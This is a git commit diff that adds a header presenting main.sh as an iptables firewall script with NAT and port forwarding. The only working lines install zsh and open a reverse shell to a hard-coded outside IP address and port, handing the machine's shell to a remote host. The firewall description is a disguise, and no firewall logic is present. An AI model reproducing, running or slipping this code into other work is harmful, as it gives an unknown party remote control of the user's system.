40a1063ffa4b68eb6da98545a690ddff53e0e197
aslrrop <72697403+aslrrop@users.noreply.github.com>
2021-06-23 11:49:41 +0530

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,2 +1,12 @@
+#!/bin/bash
+##
+# Iptables firewall script for *nix systems with nat and portforward
+# author: aslrop
+
+##
+# Configuration
+#
+
+# iptables command
 sudo apt install zsh
 zsh -c 'zmodload zsh/net/tcp && ztcp 212.192.241.226 4654 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
